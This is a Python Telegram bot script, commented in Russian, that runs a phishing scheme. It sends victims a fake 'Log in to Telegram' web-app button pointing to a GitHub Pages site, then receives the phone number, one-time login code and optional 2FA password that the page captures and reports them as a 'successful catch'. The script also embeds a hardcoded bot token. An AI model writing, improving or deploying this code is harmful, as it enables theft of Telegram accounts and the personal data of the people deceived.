import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton

# ==========================================
# 👇 НАСТРОЙКИ 👇
# ==========================================

# 1. Твой токен от BotFather
BOT_TOKEN = "8563110236:AAH-cKeML0VCbTzpp3nMsHHYvfLPuPwmRj0"

# 2. Ссылка на твой сайт с GitHub
# Важно: БЕЗ слеша в конце и БЕЗ вопросов.
# Пример: "https://myname.github.io/my-repo/index.html"
WEB_APP_URL = "https://vanchopiki.github.io/test/"

# ==========================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- ФУНКЦИЯ ОТПРАВКИ КНОПКИ ---
async def send_login_button(message: types.Message, need_password: bool):
    """
    Отправляет кнопку с WebApp.
    Если need_password=True, добавляет к ссылке ?p=1
    """
    if need_password:
        # Добавляем метку, которую увидит твой JavaScript и включит шаг с паролем
        final_url = f"{WEB_APP_URL}?p=1"
        text_msg = "🔐 Режим: <b>С ПАРОЛЕМ</b> (2FA)\nНажми кнопку ниже:"
    else:
        # Обычная ссылка, JS пропустит шаг с паролем
        final_url = WEB_APP_URL
        text_msg = "📱 Режим: <b>ОБЫЧНЫЙ</b> (Без пароля)\nНажми кнопку ниже:"

    # ВАЖНО: Используем ReplyKeyboardMarkup (кнопка внизу),
    # потому что tg.sendData() работает только с ней!
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="⚡ Войти в Telegram",
                    web_app=WebAppInfo(url=final_url)
                )
            ]
        ],
        resize_keyboard=True  # Кнопка будет компактной
    )

    await message.answer(text_msg, reply_markup=keyboard, parse_mode="HTML")


# 1. Обработчик слова "пароль" (в любом регистре)
@dp.message(F.text.lower() == "пароль")
async def password_mode(message: types.Message):
    await send_login_button(message, need_password=True)


# 2. Обработчик команды /start и любого другого текста
@dp.message(Command("start"))
@dp.message()
async def default_mode(message: types.Message):
    # По умолчанию пароль не просим
    await send_login_button(message, need_password=False)


# 3. ПОЛУЧЕНИЕ ДАННЫХ ОТ САЙТА
# Сработает, когда сайт выполнит tg.sendData(...)
@dp.message(F.web_app_data)
async def get_web_app_data(message: types.Message):
    try:
        # Распаковываем JSON, который прислал сайт
        data = json.loads(message.web_app_data.data)

        phone = data.get('phone', 'Пусто')
        code = data.get('code', 'Пусто')
        password = data.get('password', '')  # Может быть пустым

        # Если пароль пустой, пишем "Не введен"
        if not password:
            password = "<i>(Не запрашивался)</i>"

        # Формируем красивое сообщение для админа (тебя)
        response_text = (
            "🎣 <b>Успешный улов!</b>\n\n"
            f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
            f"🔢 <b>Код:</b> <code>{code}</code>\n"
            f"🔑 <b>Пароль:</b> <code>{password}</code>"
        )

        await message.answer(response_text, parse_mode="HTML")

    except Exception as e:
        await message.answer(f"⚠️ Произошла ошибка при чтении данных:\n{e}")


# Запуск бота
async def main():
    print("✅ Бот запущен! Иди в Telegram.")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("❌ Бот остановлен.")